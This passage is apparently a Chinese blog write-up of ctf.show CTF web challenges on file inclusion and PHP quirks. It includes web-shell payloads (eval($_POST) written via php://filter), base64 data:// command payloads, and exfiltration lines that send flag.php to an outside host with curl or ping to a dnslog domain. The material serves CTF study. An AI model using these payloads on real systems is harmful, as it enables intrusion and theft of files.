<h3 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h3><p>过滤的字符串</p>
<p>php ~ !   @ #   $   %  ^  &amp;  *   (     )   -    _  +  =  .</p>
<p>跟前面一样，可以直接用data伪协议读，但是解码之后最后可能会有= + 等符号，可以在后面直接加几个1来混淆</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">data:text/plain;base64,加上base64编码</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2NhdCBmKicpKTsgPz4xMTEx</span><br></pre></td></tr></table></figure>



<h3 id="web-116"><a href="#web-116" class="headerlink" title="web 116"></a>web 116</h3><p>打开可以看到是一个MP4文件，先下载下来然后用foremost分离</p>
<p>打开png文件发现图片就是源码</p>
<p>审计发现直接get方式传入一个file名就行了但是需要抓个包才能看返回值</p>
<h3 id="web-117"><a href="#web-117" class="headerlink" title="web 117"></a>web 117</h3><h4 id="ucs-2编码"><a href="#ucs-2编码" class="headerlink" title="ucs-2编码"></a>ucs-2编码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p>他的返回值就是经过编码之后的</p>
<p>然后我们直接用伪协议写<code>php://filter/write=convert.UCS-2LE.UCS-2BE/resource=a.php</code></p>
<p>来写入文件到a.php</p>
<p>contents传入我们转码之后的一句话木马</p>
<p>contents=?&lt;hp+pvela$(P_SO[T]1;)&gt;?也就是<code>&lt;?php eval($_POST[1]); ?&gt;</code></p>
<h3 id="——-文件包含也结束了——"><a href="#——-文件包含也结束了——" class="headerlink" title="——-文件包含也结束了——-"></a>——-文件包含也结束了——-</h3><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h4 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h4><p>数组绕过</p>
<h3 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h3><p>进制转换，4476转换成八进制就行了首位添加0</p>
<h3 id="web-91"><a href="#web-91" class="headerlink" title="web 91"></a>web 91</h3><p>考到了/i以及/im的区别</p>
<p>im匹配换行符</p>
<h3 id="web-92-93"><a href="#web-92-93" class="headerlink" title="web 92-93"></a>web 92-93</h3><p>同上面的90一样</p>
<h3 id="web-94"><a href="#web-94" class="headerlink" title="web 94"></a>web 94</h3><p>多了一些条件，首位不能是0，不能含有字母，不能等于4476</p>
<p>我们可以构造小数，绕过前面然后到后面intval函数直接变成int4476</p>
<h3 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h3><p>过滤了flag.php</p>
<p>因为知道flag.php是在当前目录下</p>
<p>当前目录下的文件可以用./+文件名表示</p>
<h3 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h3><p>标准的MD5绕过，可以用数组</p>
<h3 id="web-97"><a href="#web-97" class="headerlink" title="web 97"></a>web 97</h3><p>用数组绕过</p>
<h3 id="web-98"><a href="#web-98" class="headerlink" title="web 98"></a>web 98</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"><span class="meta">$</span><span class="bash">_GET?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">highlight_file($</span><span class="bash">_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>想了想还是贴上代码，考到了三元运算符的运用</p>
<p>第一个是如果传入了一个get参数，那么就把这个方法转换为post方法，因为他赋值的时候把post的地址给了get，所以我们用GET方式传入一个参数之后还需要再POST方法传入一个同样的flag，仔细看一下下面两个三元判断是没用的，可以不用管</p>
<h3 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">$</span><span class="bash">allow = array();<span class="comment">#将allow设置为数组</span></span></span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">    #给数组里面插入随机数</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">检查这个里面是否有我们输入的n的键值，in_array漏洞，如果没有设置第三个值的话那么我们输入的内容会自动转换n=1.php会转换成1</span></span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">    	#然后到这就可以写入一个一句话木马</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-100"><a href="#web-100" class="headerlink" title="web 100"></a>web 100</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;#提示flag在ctfshow</span><br><span class="line"><span class="meta">$</span><span class="bash">ctfshow = new ctfshow();<span class="comment">#新建一个ctfshow对象</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">v1=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v2=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v3=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v0=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="comment">#因为and的优先级比=低，所以我们只需要v1传入数字就行了</span></span></span><br><span class="line"><span class="meta">if($</span><span class="bash">v0)&#123;</span></span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;#v2中不含有分号</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;#v3中含有分号</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>非预期：因为什么也没有过滤所以直接命令执行就行</p>
<p>预期解：用ReflectionClass类反弹（引用一下羽师傅的wp讲解）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">public static $flag=&quot;flag&#123;123123123&#125;&quot;;</span><br><span class="line">const  PI=3.14;</span><br><span class="line">static function hello()&#123;</span><br><span class="line">    echo &quot;hello&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">a=new ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getConstants());  获取一组常量</span></span><br><span class="line">输出</span><br><span class="line"> array(1) &#123;</span><br><span class="line">  [&quot;PI&quot;]=&gt;</span><br><span class="line">  float(3.14)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getName());    获取类名</span></span><br><span class="line">输出</span><br><span class="line">string(1) &quot;A&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getStaticProperties()); 获取静态属性</span></span><br><span class="line">输出</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;flag&quot;]=&gt;</span><br><span class="line">  string(15) &quot;flag&#123;123123123&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getMethods()); 获取类中的方法</span></span><br><span class="line">输出</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line"><span class="meta">  object(ReflectionMethod)#</span><span class="bash">2 (2) &#123;</span></span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(5) &quot;hello&quot;</span><br><span class="line">    [&quot;class&quot;]=&gt;</span><br><span class="line">    string(1) &quot;A&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">原文链接：https://blog.csdn.net/miuzzx/article/details/109168454</span><br></pre></td></tr></table></figure>

<p>也就是说我们直接输出new ReflectionClass(‘ctfshow’)</p>
<p>他就会直接输出里面的内容</p>
<h3 id="web-101"><a href="#web-101" class="headerlink" title="web 101"></a>web 101</h3><p>用100的预期解</p>
<h3 id="web-102"><a href="#web-102" class="headerlink" title="web 102"></a>web 102</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">$</span><span class="bash">v1 = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v2 = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v3 = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v4 = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);</span></span><br><span class="line"><span class="meta">if($</span><span class="bash">v4)&#123;</span></span><br><span class="line">    $s = substr($v2,2);#截取v2从2开始的后续字符</span><br><span class="line">    $str = call_user_func($v1,$s);#将v1作为回调函数，将s传入</span><br><span class="line">    echo $str;#输出str</span><br><span class="line">    file_put_contents($v3,$str);#将其中的数传入v3中</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>他调用v1，v1没有任何过滤所以它可以执行任何函数，也就是说我们可以把构造的数字字符串转换成标准字符串hex2bin，特殊字符是无法转换成16进制的，但是因为他对V3没有任何过滤，也就是我们可以用伪协议来读取我们输入的数据，也就是说我们可以对我们的数据进行base64加密，然后再转换成16进制，而且需要保证转化成的16进制除了e之外没有别的字母才可以被判断成数字字符串（因为V2取第二个之后的，所以我们解码完成之后再前面需要添加两位，因为他是四个一组，而他的总共长度只有30我们正好可以在前面添加两个数字，一二开头的两位数好像都可以把）</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>

<h3 id="web-103"><a href="#web-103" class="headerlink" title="web 103"></a>web 103</h3><p>跟上面一条相比增加了一层过滤但是是在str里面所以直接用上面的就可以</p>
<h3 id="web-104"><a href="#web-104" class="headerlink" title="web 104"></a>web 104</h3><p>他对v1 v2没有任何要求，他们俩相等就行</p>
<h3 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">error=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">suces=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span></span><br><span class="line"><span class="meta">foreach($</span><span class="bash">_GET as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">#对GET进行遍历</span></span></span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;#参数不能有error</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;#进行覆盖赋值</span><br><span class="line">&#125;foreach($_POST as $key =&gt; $value)&#123;#对POST参数进行遍历</span><br><span class="line">    if($value===&#x27;flag&#x27;)&#123;#参数不能有flag</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;#覆盖赋值</span><br><span class="line">&#125;</span><br><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;your are good&quot;.$flag.&quot;\n&quot;;</span><br><span class="line"><span class="meta">die($</span><span class="bash">suces);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>suces=flag     = 》   $suces = $flag绕过第一个flag</p>
<p>error = suces   =》 $error = $suces    = 》$error = $flag</p>
<p>flag直接不传，进入下面的if然后直接输出error</p>
<h3 id="web-106"><a href="#web-106" class="headerlink" title="web 106"></a>web 106</h3><p>数组绕过</p>
<h3 id="web-107"><a href="#web-107" class="headerlink" title="web 107"></a>web 107</h3><p>parse_str — 将字符串解析成多个变量</p>
<p>也就是说我们V1需要传入一组key=value的形式key是flag要他的value等于v3MD5之后的值，我们可以找MD5之后为0e开头的数然后让flag = 0</p>
<h3 id="web-108"><a href="#web-108" class="headerlink" title="web 108"></a>web 108</h3><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>所以随便输入一串字符串然后截断后面填写我们需要的数字877的反转778</p>
<h3 id="web-109"><a href="#web-109" class="headerlink" title="web 109"></a>web 109</h3><p>可以抛出一个异常，或者用上面的反射类，直接反射出其中v2中的内容v2构造system(‘cat fl36dg.txt’)</p>
<h3 id="web-110"><a href="#web-110" class="headerlink" title="web 110"></a>web 110</h3><p>学到一个类：获取<strong>指定目录</strong>下的所有文件的类 <code>FilesystemIterator</code></p>
<p>以及一个函数：返回当前目录：getcwd</p>
<p>但是我的flag文件好像不在第一个，没拿到flag，解法没错的</p>
<h3 id="web-111"><a href="#web-111" class="headerlink" title="web 111"></a>web 111</h3><p>题目的意思是v1得等于ctfshow然后V2必须是全是英文字符然后赋值给v1执行var_dump，因为没有给其他的变量，所以我们可以用全局变量来解决，直接构造var_dump(GLOBALS)</p>
<h3 id="web-112"><a href="#web-112" class="headerlink" title="web 112"></a>web 112</h3><p>直接用伪协议读取flag.php就好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-113"><a href="#web-113" class="headerlink" title="web 113"></a>web 113</h3><p>过滤了filter，另找方法：compress.zlib://这个函数相当于gzpoen，因为括号被禁用所以用这个替代</p>
<p><strong>gzopen（）</strong>，一般用来打开gzip文件读写，可用于读取非gzip格式的文件；在这种情况下，<a class="link" href="https://runebook.dev/zh-CN/docs/php/function.gzread">gzread（）<i class="fas fa-external-link-alt"></i></a>将直接从文件读取而不进行解压缩。</p>
<p>据说还有一种方法绕过is_file:</p>
<p>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</p>
<p><strong>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容.多次重复后可以绕过is_file</strong></p>
<h3 id="web-114"><a href="#web-114" class="headerlink" title="web 114"></a>web 114</h3><p>这里虽然过滤了compress但是又把filter放出来了，过滤了convert过滤器，我们可以不经过过滤直接读</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-115"><a href="#web-115" class="headerlink" title="web 115"></a>web 115</h3><p>我们需要输入这个num但是num要经过trim过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： </span><br><span class="line">◦ &quot; &quot; (ASCII 32 (0x20))，普通空格符。  </span><br><span class="line">◦ &quot;\t&quot; (ASCII 9 (0x09))，制表符。  </span><br><span class="line">◦ &quot;\n&quot; (ASCII 10 (0x0A))，换行符。  </span><br><span class="line">◦ &quot;\r&quot; (ASCII 13 (0x0D))，回车符。  </span><br><span class="line">◦ &quot;\0&quot; (ASCII 0 (0x00))，空字节符。  </span><br><span class="line">◦ &quot;\x0B&quot; (ASCII 11 (0x0B))，垂直制表符。 </span><br></pre></td></tr></table></figure>

<p>然后还要经过上面的替换，这个过滤的话，我们可以写一个简单的fuzz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">for($</span><span class="bash">i=0;<span class="variable">$i</span>&lt;129;<span class="variable">$i</span>++)&#123;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">s = chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"><span class="meta">	if(is_numeric($</span><span class="bash">s) and tirm(<span class="variable">$s</span>)!==<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="meta">		echo(urlencode(chr($</span><span class="bash">i).<span class="string">&#x27;\n&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">%</span><span class="bash">0c  换页符</span></span><br><span class="line"><span class="meta">%</span><span class="bash">2B   +</span></span><br></pre></td></tr></table></figure>

<p>加会被替换所以用%0c36</p>
<h3 id="web-123"><a href="#web-123" class="headerlink" title="web 123"></a>web 123</h3><p>php的变量名是只能有数字字母下划线的，其中的<code>空格 + [ .</code>会被替换成下划线，但是有一个特性可以变量里面出现<code>.</code>那就是<code>[</code>这个符号出现之后被替换成下划线但是后面的符号是不会被替换的，后面的点也就会维持原样</p>
<p>CTF_SHOW.COM =&gt;CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>然后进入eval($c.’;’)，没有任何过滤直接<code>echo $flag</code></p>
<h3 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h3><p>没有过滤highlight_file，给fun一个get传参，然后gei传入一个flag.php</p>
<h3 id="web-126"><a href="#web-126" class="headerlink" title="web 126"></a>web 126</h3><p><code>$a=$_SERVER[&#39;argv&#39;];</code>这个函数在我们输入参数时进行记录或者覆盖</p>
<p>比如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">a=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当我们直接传入参数时她会记录在数组中</p>
<p>比如我们传入aaa=bbb时她会返回<code>array(1) &#123; [0]=&gt; string(7) &quot;aaa=bbb&quot; &#125;</code></p>
<p>这样我们就可以将其分割成数组形式进行变量覆盖parse_str进行分割</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">get：?c=1+fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br><span class="line">或者直接用assert也行</span><br><span class="line">get:?$fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=assert($a[0])</span><br><span class="line">因为assert中传入字符串是会当作代码执行，也就是说我们直接把flag_give_me赋值给了fl0g</span><br></pre></td></tr></table></figure>

<h3 id="web-127"><a href="#web-127" class="headerlink" title="web 127"></a>web 127</h3><p>fuzz一下看一下没有被过滤的字符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">space % &amp; 0 1 2 3 4 5 6 7 8 9 = ? A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z | </span><br></pre></td></tr></table></figure>

<p>我们需要构造覆盖，但是下划线被过滤了，我们知道有几个字符在get传参是会自动转换成下划线<code>space [ . + </code></p>
<p>而且后面三个都被过滤了所以用空格就行</p>
<h3 id="web-128"><a href="#web-128" class="headerlink" title="web 128"></a>web 128</h3><p>学到一个骚姿势：</p>
<p>gettext()    或者_()</p>
<p>她会实现程序的国际化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假如你的没有国际化的程序里有这样的代码，echo &quot;你好&quot;;,而国际化的程序你要写成 echo gettext(&quot;你好&quot;);，然后再在配置文件里添加“你好”相对应的英文“Hi”。</span><br><span class="line">这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，才会输出程序里面的内容。</span><br></pre></td></tr></table></figure>

<p>这样我们就可以查看后面文件中的内容</p>
<p>_(get_defined_vars)之后就会变成</p>
<p>call_user_func(get_defind_vars)直接会返回已经定义的变量数组</p>
<h3 id="web-129"><a href="#web-129" class="headerlink" title="web 129"></a>web 129</h3><p>题目得到意思是我们输入的f里面一定要包含ctfshow而且不能在第一位，而且运用的是readfile函数，那么我们就可以想到这个题目意思应该是我们需要猜测flag所在目录，因为必须要包含ctfshow，那么就应该是有一个ctfshow文件夹的存在，我们直接退出目录然后从根目录打开/vat/www/html/flag.php</p>
<h3 id="web-130"><a href="#web-130" class="headerlink" title="web 130"></a>web 130</h3><p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复</p>
<p>题目的意思应该是ctfshow之前不能存在东西，然后ctfshow必须在我们输入的数的第一位</p>
<p>直接f=ctfshow</p>
<h3 id="web-131"><a href="#web-131" class="headerlink" title="web 131"></a>web 131</h3><p>正则匹配的回溯次数有上线，100万，当我们输入的值超过这个值的时候，他就会溢出，返回直接返回false</p>
<p>也就是说我们在36Dctfshow之前传入一个溢出值，他就会直接绕过第一个正则判断</p>
<p>也就是输入一百万个字符，我们可以直接用四个字符*250000后面接一个36Dctfshow就可以</p>
<h3 id="web-132"><a href="#web-132" class="headerlink" title="web 132"></a>web 132</h3><p>&amp;&amp;运算符：全1出1，当左边为0时不计算直接返回0</p>
<p>题目要code是1到877的随机数，如果直接不管他就会直接进后面的||运算，所以我们只需要username=admin就行了</p>
<p>进入到下面的一个判断，需要code等于admin，那么我们直接设定code=admin,username=admin,password=1</p>
<p>就行了</p>
<h3 id="web-133"><a href="#web-133" class="headerlink" title="web 133"></a>web 133</h3><p>题目的意思是可以执行命令但是没有回显</p>
<p>我们直接分号截断他的substr就行了</p>
<p>因为只有6个字符，所以我们可以覆盖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f=`$f`;</span><br><span class="line">这样不仅进行了截断还可以继续执行后面我们输入的语句</span><br><span class="line">比如</span><br><span class="line">f=`$f`;+sleep 3;</span><br><span class="line">当我们运行的时候网页确实sleep了</span><br><span class="line">说明我们后面的文件执行了</span><br><span class="line">但是为什么会执行呢</span><br><span class="line">因为我们进行了覆盖</span><br><span class="line">那么现在也就是``$f`; sleep 3;`</span><br><span class="line">``是shell_exec的缩写</span><br><span class="line">也就是shell_exec(`$f`; sleep 3)</span><br><span class="line">前面不用管，后面的函数我们是可以进行控制的</span><br><span class="line">因为他没有回显，我们就可以用反弹shell或者外带的形式，把flag.php给传到我们自己的网站这里来</span><br></pre></td></tr></table></figure>

<p>可以用bp接收</p>
<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">f=`$f`;+curl -X POST -F xx=@flag.php http://+bp给的网址</span><br></pre></td></tr></table></figure>

<p>详细操作：</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_1.png" alt="1"></p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_2.png" alt="1"></p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_3.png" alt="1"></p>
<p>拿到flag.php文件</p>
<h3 id="web-134"><a href="#web-134" class="headerlink" title="web 134"></a>web 134</h3><p>由<code>extract（$_POST）</code>以及<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;])</code></p>
<p>组合成的数组覆盖漏洞</p>
<p>首先进入题目是get以及post方式都不能传入key1、key2但是下面得判断key1、key2等于36d</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line">extract — 从数组中将变量导入到当前的符号表</span><br></pre></td></tr></table></figure>

<p>测试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php				url?_POST[key1]=1</span><br><span class="line"><span class="meta">$</span><span class="bash">key1 = 0;</span></span><br><span class="line">echo &quot;&#123;$key1&#125;&quot;;</span><br><span class="line"><span class="meta">@parse_str($</span><span class="bash">_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_POST);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_POST);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&#123;$key1&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">array(1) &#123; [&quot;key1&quot;]=&gt; string(1) &quot;1&quot; &#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>可以看到第一开始的时候key1是0但是经过下面的分解之后他将我们在url上面赋值的_POST[key1]=1覆盖原本post值的内容，然后对post进行一个extract</p>
<p>解析成变量名：也就是说我们现在又执行了$key1=1又对key1进行了一次赋值这样可以更改他的值变成36d</p>
<h3 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h3><p>是133plus：</p>
<p>相较上面多过滤了一些函数，curl被过滤了，主要考的还是外带信息，可以用ping</p>
<p>前面跟上面还是一样的但是由curl变成了ping，因为在dnslog不能全回显，所以我们西药用awk以及nr配合读取行数，刚开始读取还是不行我们需要添加一层“正则”匹配一下flag中的数字还有字母，这样才能回显</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">?F=`$F `; ping `nl f*|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.a33jsr.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>还有一种方法，就是直接重定向到一个我们新建的文件中，直接访问下载就能拿到flag</p>
<p><code>nl f*&gt;xxx</code></p>
<p>然后访问xxx文件就行了</p>
<h3 id="web-136"><a href="#web-136" class="headerlink" title="web 136"></a>web 136</h3><p>没有过滤写文件tee,我们可以将前面查询的内容输出到文件</p>
<p><code>ls /|tee 1</code>可以将根目录的文件写入1文件中然后将找到的flag文件写入到另一个文件中访问下载即可</p>
<p>骚姿势：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls |xargs sed -i &#x27;s/die/echo/&#x27;</span><br><span class="line">ls |xargs sed -i &#x27;s/exec/system/&#x27;</span><br></pre></td></tr></table></figure>

<p>通过php内部语言将网页中的php代码更改，然后直接命令执行</p>
<h3 id="web-137"><a href="#web-137" class="headerlink" title="web 137"></a>web 137</h3><p>讲到调用call_user_func的方法以及-&gt;跟::调用类中成员的方法</p>
